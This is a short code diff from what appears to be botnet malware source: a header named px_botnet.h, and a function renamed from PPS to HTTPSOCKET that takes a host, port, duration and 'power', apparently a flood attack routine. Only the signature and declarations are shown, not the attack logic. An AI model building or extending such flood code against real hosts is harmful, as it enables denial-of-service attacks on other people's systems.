@@ -1,8 +1,6 @@
 #include "../../includes/px_botnet.h"
 
-extern const char *useragents[];
-
-void PPS(char *host, in_port_t port, int timeEnd, int power)
+void HTTPSOCKET(char *host, in_port_t port, int timeEnd, int power)
 {
 	int error = 0, socket, i, end = time(NULL) + timeEnd, sendIP = 0;
 	char request[32], buffer[1];
